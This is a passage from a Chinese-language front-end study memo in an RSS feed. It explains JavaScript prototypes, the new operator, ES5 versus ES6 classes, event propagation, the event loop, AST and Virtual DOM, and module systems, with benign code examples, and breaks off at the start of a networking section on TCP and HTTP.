Function<span>.</span>__proto__ <span>===</span> <span>Function</span><span>.</span>prototype <span>// => true</span>
<span>Function</span><span>.</span>prototype<span>.</span>__proto__ <span>===</span> <span>Object</span><span>.</span>prototype <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><p>提示</p>
<img :src="$withBase('/images/JavaScript/原型链.png')" loading="lazy">
</div>
<h2 id="_6-new-运算符"> 6. new 运算符</h2>
<ul>
<li>
<p>new 执行步骤。</p>
<blockquote>
<ol>
<li>创建一个空对象（{ }）。</li>
<li>将新建对象的隐式原型（__proto__）指向构造函数的显示原型（prototype）。</li>
<li>将构造函数里的 this 指向新建对象（将新建对象作为 this 的上下文）。</li>
<li>如果构造函数没有返回对象，则返回新建对象（返回 this）。</li>
</ol>
</blockquote>
</li>
<li>
<p>手写 new。</p>
<div><pre><code><span>function</span> <span>_new</span><span>(</span><span>Fn<span>,</span> <span>...</span>arg</span><span>)</span> <span>{</span>
  <span>const</span> obj <span>=</span> Object<span>.</span><span>create</span><span>(</span><span>Fn</span><span>.</span>prototype<span>)</span>
  <span>Fn</span><span>.</span><span>apply</span><span>(</span>obj<span>,</span> arg<span>)</span>
  <span>return</span> obj
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
</ul>
<h2 id="_7-es5-与-es6-类的区别"> 7. ES5 与 ES6 类的区别</h2>
<table>
<thead>
<tr>
<th>ES5</th>
<th>ES6</th>
</tr>
</thead>
<tbody>
<tr>
<td>使用构造函数实现</td>
<td>使用 class 实现</td>
</tr>
<tr>
<td>内部为非严格模式</td>
<td>类和内部均为严格模式</td>
</tr>
<tr>
<td>声明会提升</td>
<td>声明不会提升</td>
</tr>
<tr>
<td>原型链上的方法默认可枚举</td>
<td>原型链上的方法默认不可枚举</td>
</tr>
<tr>
<td>可自调用，this 指向全局（window）</td>
<td>必须使用 new 调用</td>
</tr>
<tr>
<td>定义的方法可以被 new</td>
<td>定义的方法不能被 new（没有 prototype）</td>
</tr>
<tr>
<td>内部可以重写类</td>
<td>内部不能重写类</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>ES5</p>
<div><pre><code><span>new</span> <span>Foo</span><span>(</span><span>)</span> <span>// 不报错</span>

<span>function</span> <span>Foo</span><span>(</span><span>)</span> <span>{</span>
  name <span>=</span> <span>'Neo'</span> <span>// 不报错</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>)</span> <span>// => window</span>
  Foo <span>=</span> <span>'Matrix'</span> <span>// 可重写</span>
<span>}</span>
<span>Foo</span><span>.</span>prototype<span>.</span><span>rank</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span><span>}</span>

<span>const</span> foo <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>)</span>

<span>for</span> <span>(</span><span>const</span> key <span>in</span> foo<span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>)</span> <span>// => 'rank'</span>

<span>new</span> <span>foo<span>.</span>rank</span><span>(</span><span>)</span> <span>// 不报错</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
<li>
<p>ES6</p>
<div><pre><code><span>new</span> <span>Foo</span><span>(</span><span>)</span> <span>// Uncaught ReferenceError: Cannot access 'Foo' before initialization</span>

<span>class</span> <span>Foo</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    name <span>=</span> <span>'Neo'</span> <span>// Uncaught ReferenceError: b is not defined</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>)</span>
    Foo <span>=</span> <span>'Matrix'</span> <span>// Uncaught TypeError: Assignment to constant variable</span>
  <span>}</span>
  <span>rank</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>}</span>

<span>const</span> foo <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>)</span>

<span>for</span> <span>(</span><span>const</span> key <span>in</span> foo<span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>)</span> <span>// 无输出</span>

<span>new</span> <span>foo<span>.</span>rank</span><span>(</span><span>)</span> <span>// => Uncaught TypeError: foo.rank is not a constructor</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div></li>
</ul>
<h2 id="_8-事件捕获、事件冒泡、事件委托-事件代理"> 8. 事件捕获、事件冒泡、事件委托（事件代理）</h2>
<ul>
<li>
<p>事件捕获和事件冒泡基于 addEventListener 监听事件，事件委托（事件代理）基于事件冒泡。</p>
</li>
<li>
<p>事件捕获是指当要触发子级事件前，如果父级有相同事件，就会先触发父级的事件，再触发子级事件（事件捕获默认不开启）。</p>
</li>
<li>
<p>事件冒泡是指触发子级事件后，如果父级有相同事件，接着触发父级的事件（事件冒泡默认开启）。</p>
</li>
<li>
<p>当要给多个子级触发相同事件时，可以把事件定义到父级上，通过事件冒泡触发父级上的事件，从而提升性能。此方式称为事件委托（事件代理）。</p>
<blockquote>
<p>点击 box3，依次打印：'box1' -&gt; 'box2' -&gt; 'box3' -&gt; 'box3' -&gt; 'box2' -&gt; 'box1'</p>
</blockquote>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1.0<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
    <span><span><span>&lt;</span>style</span><span>></span></span><span><span>
      <span>body</span> <span>{</span>
        <span>height</span><span>:</span> 100vh<span>;</span>
        <span>display</span><span>:</span> grid<span>;</span>
      <span>}</span>
      <span>#box1</span> <span>{</span>
        <span>width</span><span>:</span> 500px<span>;</span>
        <span>height</span><span>:</span> 500px<span>;</span>
        <span>background</span><span>:</span> gold<span>;</span>
        <span>display</span><span>:</span> grid<span>;</span>
        <span>place-self</span><span>:</span> center<span>;</span>
      <span>}</span>
      <span>#box2</span> <span>{</span>
        <span>width</span><span>:</span> 350px<span>;</span>
        <span>height</span><span>:</span> 350px<span>;</span>
        <span>background</span><span>:</span> aqua<span>;</span>
        <span>display</span><span>:</span> grid<span>;</span>
        <span>place-self</span><span>:</span> center<span>;</span>
      <span>}</span>
      <span>#box3</span> <span>{</span>
        <span>width</span><span>:</span> 150px<span>;</span>
        <span>height</span><span>:</span> 150px<span>;</span>
        <span>background</span><span>:</span> pink<span>;</span>
        <span>place-self</span><span>:</span> center<span>;</span>
      <span>}</span>
    </span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>
  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>box1<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>box2<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>box3<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
      <span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>script</span><span>></span></span><span><span>
      <span>// 事件冒泡</span>
      box1<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'box1'</span><span>)</span><span>)</span>
      box2<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'box2'</span><span>)</span><span>)</span>
      box3<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'box3'</span><span>)</span><span>)</span>
      <span>// 事件捕获</span>
      box1<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'box1'</span><span>)</span><span>,</span> <span>true</span><span>)</span>
      box2<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'box2'</span><span>)</span><span>,</span> <span>true</span><span>)</span>
      box3<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'box3'</span><span>)</span><span>,</span> <span>true</span><span>)</span>
    </span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br></div></div></li>
</ul>
<h2 id="_9-事件循环-event-loop"> 9. 事件循环（Event Loop）</h2>
<ul>
<li>
<p>由于 JS 是单线程的，需要异步方式来防止代码运行阻塞，从而产生事件循环机制。</p>
</li>
<li>
<p>事件循环中涉及到同步任务和异步任务，异步任务又可以分为宏任务（macro-task）和微任务（micro-task）。微任务队列，每次会执行队列里的全部任务。如果在微任务的执行中又加入了新的微任务，也会在这一步一起执行。同一循环微任务过多会导致长时间不能将主线程交给浏览器，造成页面卡顿。宏任务队列，每次只会执行队列内的一个任务。</p>
</li>
<li>
<p>事件循环中可能会有一个或多个任务队列，这些队列分别为了处理 <code>鼠标和键盘事件</code>、<code>其他的一些 Task</code>。浏览器会在保持任务顺序的前提下，可能分配四分之三的优先权给鼠标和键盘事件，保证用户的输入得到最高优先级的响应，而剩下的优先级交给其他 Task，并且保证不会 “饿死” 它们。</p>
</li>
<li>
<p>微任务（micro-task）</p>
<blockquote>
<ol>
<li>Process.nextTick（仅 Node 中存在，在微任务队列执行之前执行）</li>
<li>Promise（Async/Await 本质是 promise）</li>
<li>MutationObserver（仅浏览器中存在，html5 新特性）</li>
<li>queueMicrotask</li>
</ol>
</blockquote>
</li>
<li>
<p>宏任务（macro-task）</p>
<blockquote>
<ol>
<li>script（整体代码）</li>
<li>MessageChannel</li>
<li>setTimeout</li>
<li>setInterval</li>
<li>setImmediate（IE 10 和 Node 中存在）</li>
<li>requestAnimationFrame（仅浏览器中存在）</li>
<li>requestIdleCallback（仅浏览器中存在）</li>
<li>I/O</li>
<li>UI render（仅浏览器中存在）</li>
</ol>
</blockquote>
</li>
<li>
<p>在浏览器中，setTimeout()/setInterval() 的每调用一次定时器的最小间隔是 4ms，这通常是由于函数嵌套导致（嵌套层级达到一定深度），或者是由于已经执行的 setInterval 的回调函数阻塞导致的。在 Chrome 和 Firefox 中，定时器的第 5 次调用被阻塞了（<a href="https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/frame/DOMTimer.cpp#39" target="_blank" rel="noopener noreferrer">chromium</a>）；在 Safari 是在第 6 次；Edge 是在第 3 次。</p>
</li>
<li>
<p>在浏览器中，setTimeout()/setInterval() 非间隔执行，Chrome 和 Node 中执行最小时长均为 1ms（<a href="https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/frame/DOMTimer.cpp#40" target="_blank" rel="noopener noreferrer">chromium</a>），Firefox 中为 0ms。</p>
<blockquote>
<p>Chrome 和 Node 打印顺序：1 -&gt; 0。
Firefox 打印顺序：0 -&gt; 1。</p>
</blockquote>
<div><pre><code><span>setTimeout</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>,</span> <span>1</span><span>)</span>
<span>setTimeout</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>0</span><span>)</span><span>,</span> <span>0</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>包括 IE、Chrome、Safari、Firefox 在内的浏览器其内部以 32 位带符号整数存储延时。这就会导致如果一个延时（delay）大于 2147483647 毫秒（大约 24.8 天）时就会溢出，导致定时器将会被立即执行。</p>
<blockquote>
<p>Chrome 和 Node 大概输出 1。
Firefox 大概输出 0。</p>
</blockquote>
<div><pre><code><span>const</span> startTime <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
<span>setTimeout</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> startTime<span>)</span><span>,</span> <span>2147483648</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>setInterval 本质上是每隔一定的时间向任务队列添加回调函数。在向队列中添加回调函数时，如果队列中存在之前由其添加的回调函数，就放弃本次添加（不会影响之后的计时）。</p>
<blockquote>
<p>间隔执行 fn 时间（intervalTime）约为 300ms。</p>
</blockquote>
<div><pre><code><span>let</span> count <span>=</span> <span>0</span><span>,</span>
  execEnd <span>=</span> <span>0</span>

<span>const</span> <span>fn</span> <span>=</span> <span>delay</span> <span>=></span> <span>{</span>
  <span>const</span> execStart <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span><span>'intervalTime'</span><span>,</span> execEnd <span>&amp;&amp;</span> execStart <span>-</span> execEnd<span>)</span>
  <span>while</span> <span>(</span>Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>&lt;</span> execStart <span>+</span> delay<span>)</span> <span>continue</span>
  execEnd <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
<span>}</span>

<span>const</span> timer <span>=</span> <span>setInterval</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>fn</span><span>(</span><span>700</span><span>)</span>
  count<span>++</span>
  <span>if</span> <span>(</span>count <span>></span> <span>3</span><span>)</span> <span>clearInterval</span><span>(</span>timer<span>)</span>
<span>}</span><span>,</span> <span>1000</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><blockquote>
<p>异步轮询勿使用 setInterval。</p>
</blockquote>
<div><pre><code><span>const</span> <span>request</span> <span>=</span> <span>delay</span> <span>=></span> <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>setTimeout</span><span>(</span>resolve<span>,</span> delay<span>)</span><span>)</span>

<span>const</span> timer <span>=</span> <span>setInterval</span><span>(</span><span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>await</span> <span>request</span><span>(</span><span>3000</span><span>)</span> <span>// 执行三次</span>
  console<span>.</span><span>log</span><span>(</span><span>'request'</span><span>)</span>
<span>}</span><span>,</span> <span>1000</span><span>)</span>

<span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>clearTimeout</span><span>(</span>timer<span>)</span>
<span>}</span><span>,</span> <span>1000</span> <span>*</span> <span>3.5</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
<li>
<p>可能打印顺序：6 -&gt; 7 -&gt; 3 -&gt; 2 -&gt; 4 -&gt; 1 -&gt; 5。</p>
<blockquote>
<ul>
<li>requestAnimationFrame（重绘前）和 requestIdleCallback（空闲时）执行顺序不确定，取决于浏览器。requestAnimationFrame 在 requestIdleCallback 之前执行。</li>
<li>Promise（then）和 queueMicrotask 一定最先执行，执行顺序与注册顺序一致。</li>
<li>MessageChannel 在 setTimeout 和 setInterval 之前执行。setTimeout 和 setInterval 执行顺序与注册顺序一致（浏览器间有差异，Firefox 中 MessageChannel、setTimeout、setInterval 按注册顺序执行）。</li>
</ul>
</blockquote>
<div><pre><code><span>setTimeout</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>)</span>
<span>const</span> <span>{</span> port1<span>,</span> port2 <span>}</span> <span>=</span> <span>new</span> <span>MessageChannel</span><span>(</span><span>)</span>
port1<span>.</span><span>onmessage</span> <span>=</span> <span>(</span><span><span>{</span> data <span>}</span></span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>data<span>)</span>
port2<span>.</span><span>postMessage</span><span>(</span><span>2</span><span>)</span>
<span>requestAnimationFrame</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>3</span><span>)</span><span>)</span>
<span>requestIdleCallback</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>4</span><span>)</span><span>)</span>
<span>const</span> timer <span>=</span> <span>setInterval</span><span>(</span><span>_</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>5</span><span>)</span>
  <span>clearInterval</span><span>(</span>timer<span>)</span>
<span>}</span><span>)</span>
Promise<span>.</span><span>resolve</span><span>(</span><span>6</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span>
<span>queueMicrotask</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>7</span><span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div></li>
<li>
<p>并不是每一个宏任务都会紧跟着一次渲染。</p>
<blockquote>
<p>打印顺序：mic -&gt; mic -&gt; sto -&gt; sto -&gt; rAF -&gt; rAF</p>
</blockquote>
<div><pre><code><span>// 间隔时间较短，浏览器会合并这两个定时器任务</span>
<span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'sto'</span><span>)</span>
  <span>requestAnimationFrame</span><span>(</span><span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'rAF'</span><span>)</span><span>)</span>
<span>}</span><span>)</span>
<span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'sto'</span><span>)</span>
  <span>requestAnimationFrame</span><span>(</span><span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'rAF'</span><span>)</span><span>)</span>
<span>}</span><span>)</span>

<span>queueMicrotask</span><span>(</span><span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'mic'</span><span>)</span><span>)</span>
<span>queueMicrotask</span><span>(</span><span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'mic'</span><span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div></li>
<li>
<p>chrome 73 版本前的 await 后续代码执行时机会低于 promise.then()。</p>
<blockquote>
<ul>
<li>73 版本前打印顺序：<code>promise1 -&gt; promise2 -&gt; async1</code></li>
<li>73 版本及以上打印顺序：<code>async1 -&gt; promise1 -&gt; promise2</code></li>
</ul>
</blockquote>
<div><pre><code><span>async</span> <span>function</span> <span>async1</span><span>(</span><span>)</span> <span>{</span>
  <span>await</span> <span>777</span>
  console<span>.</span><span>log</span><span>(</span><span>'async1'</span><span>)</span>
<span>}</span>

<span>async1</span><span>(</span><span>)</span>

<span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>{</span>
  <span>resolve</span><span>(</span><span>)</span>
<span>}</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'promise1'</span><span>)</span>
  <span>}</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'promise2'</span><span>)</span>
  <span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div></li>
<li>
<p>Node 中的 Event Loop 基于 libuv 实现。Node v11 及以上版本的 Event Loop 与浏览器一致，v10 及以下版本有些许差异。</p>
<blockquote>
<p>在 Node v10 及以下版本，若 time2 定时器已经在执行队列中，打印顺序为：<code>timer1 -&gt; timer2 -&gt; promise1 -&gt; promise2</code></p>
</blockquote>
<div><pre><code><span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'timer1'</span><span>)</span>
  Promise<span>.</span><span>resolve</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'promise1'</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span><span>,</span> <span>0</span><span>)</span>

<span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'timer2'</span><span>)</span>
  Promise<span>.</span><span>resolve</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'promise2'</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span><span>,</span> <span>0</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
</ul>
<div><p>Node v10 及以下，当 time2 定时器已经在执行队列中图示</p>
<img :src="$withBase('/images/JavaScript/Even Loop（Node v10）.gif')" loading="lazy">
</div>
<div><p>Node v11 及以上与浏览器图示</p>
<img :src="$withBase('/images/JavaScript/Even Loop（Node v11 and Browser）.gif')" loading="lazy">
</div>
<div><p>Event Loop 图示</p>
<img :src="$withBase('/images/JavaScript/Even Loop（Browser）.gif')" loading="lazy">
</div>
<ul>
<li>
<p><a href="https://juejin.cn/post/6844904165462769678" target="_blank" rel="noopener noreferrer">深入解析你不知道的 EventLoop 和浏览器渲染、帧动画、空闲回调（动图演示） - ssh_晨曦时梦见兮</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6844903764202094606" target="_blank" rel="noopener noreferrer">一次弄懂 Event Loop（彻底解决此类面试问题） - 光光同学</a></p>
</li>
<li>
<p><a href="https://www.jsv9000.app/" target="_blank" rel="noopener noreferrer">Event Loop 可视化</a></p>
</li>
</ul>
<h2 id="_10-ast-和-virtual-dom"> 10. AST 和 Virtual DOM</h2>
<ul>
<li>
<p>AST（抽象语法树）是用对象描述 JS 语法，Virtual DOM（虚拟 DOM）是用对象描述真实 DOM 元素。</p>
</li>
<li>
<p>AST 作用。</p>
<blockquote>
<ol>
<li>IDE 的错误提示、代码格式化、代码高亮、代码自动补全等。</li>
<li>JSLint、JSHint 对代码错误或风格的检查等。</li>
<li>webpack、rollup 进行代码打包等。</li>
<li>CoffeeScript、TypeScript、JSX 等转化为原生 Javascript。</li>
<li>Vue 模板编译、React 模板编译。</li>
</ol>
</blockquote>
</li>
<li>
<p>Virtual DOM 优点。</p>
<blockquote>
<ol>
<li>容易实现跨平台开发（React Native、React Art）。</li>
<li>利用 DOM-DIFF 实现增量更新，减少重排重绘。</li>
<li>处理浏览器兼容性问题，避免直接操作真实 DOM（合成事件）。</li>
<li>内容经过了 XSS 处理，防范 XSS 攻击。</li>
<li>相较于 DOM 有体积上的优势，能够减少属性比较时的内存开销。</li>
</ol>
</blockquote>
</li>
<li>
<p>虚拟 DOM 真正的价值从来都不是性能（<a href="https://www.zhihu.com/question/31809713/answer/53544875" target="_blank" rel="noopener noreferrer">尤大语录</a>）。</p>
<blockquote>
<ol>
<li>虚拟 DOM 为函数式的 UI 编程方式打开了大门。</li>
<li>虚拟 DOM 可以渲染到 DOM 以外的 backend，比如 ReactNative。</li>
</ol>
</blockquote>
</li>
<li>
<p><a href="https://juejin.cn/post/6844903725228621832" target="_blank" rel="noopener noreferrer">平庸前端码农之蜕变 — AST - CodeLittlePrince</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6983842832680812574" target="_blank" rel="noopener noreferrer">你怎么可以不了解 AST 呢？ - 微医前端团队</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6844904035271573511" target="_blank" rel="noopener noreferrer">手把手带你入门 AST 抽象语法树 - 叫我小明呀</a></p>
</li>
<li>
<p><a href="https://astexplorer.net/" target="_blank" rel="noopener noreferrer">转换为 AST - astexplorer</a></p>
</li>
</ul>
<h2 id="_11-cjs-与-ems-区别"> 11. CJS 与 EMS 区别</h2>
<table>
<thead>
<tr>
<th>CommonJS</th>
<th>ES6 Module</th>
</tr>
</thead>
<tbody>
<tr>
<td>输出的是一个值的拷贝</td>
<td>输出的是值的引用</td>
</tr>
<tr>
<td>会缓存值</td>
<td>不会缓存值</td>
</tr>
<tr>
<td>运行时加载</td>
<td>编译时输出接口</td>
</tr>
<tr>
<td>不容易实现 Tree Shaking</td>
<td>容易实现 Tree Shaking</td>
</tr>
</tbody>
</table>
<div><p>提示</p>
<p>CommonJS 引入：Webpack 5 以下版本无 Tree Shaking，5 版本部分可以 Tree Shaking。</p>
</div>
<ul>
<li>
<p><a href="https://juejin.cn/post/6994224541312483336" target="_blank" rel="noopener noreferrer">「万字进阶」深入浅出 Commonjs 和 Es Module - 我不是外星人</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6844903576309858318" target="_blank" rel="noopener noreferrer">前端模块化：CommonJS,AMD,CMD,ES6 - subwaydown</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>前端备忘录</title>
      <link>https://www.matrixtheone.ga/web/memo/</link>
      <guid>https://www.matrixtheone.ga/web/memo/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">前端备忘录</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/情书.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>网络</title>
      <link>https://www.matrixtheone.ga/web/memo/Network/</link>
      <guid>https://www.matrixtheone.ga/web/memo/Network/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">网络</source>
      <category>网络</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-tcp"> 1. TCP</h2>
<ul>
<li>
<p>TCP 是一个面向连接的、可靠的、基于字节流的传输层协议。</p>
</li>
<li>
<p>三次握手：握手需要三次是为了确认双方的发送能力和接收能力。</p>
<img :src="$withBase('/images/Network/TCP 三次握手.png')" loading="lazy">
</li>
<li>
<p>四次挥手：挥手四次是须等待服务端所有数据发送完成，确认双方都已做好断开连接的准备。</p>
<img :src="$withBase('/images/Network/TCP 四次挥手.png')" loading="lazy">
</li>
<li>
<p><a href="https://juejin.cn/post/6844904070889603085" target="_blank" rel="noopener noreferrer">(建议收藏)TCP 协议灵魂之问，巩固你的网路底层基础 - 神三元</a></p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/BV1V54y1y7c4" target="_blank" rel="noopener noreferrer">HTTP 协议详解（TIPS：在评论处） - 巨靠谱的小宇同学</a></p>
</li>
</ul>
<h2 id="_2-http、https、http-2"> 2. HTTP、HTTPS、HTTP/2</h2>
<ul>
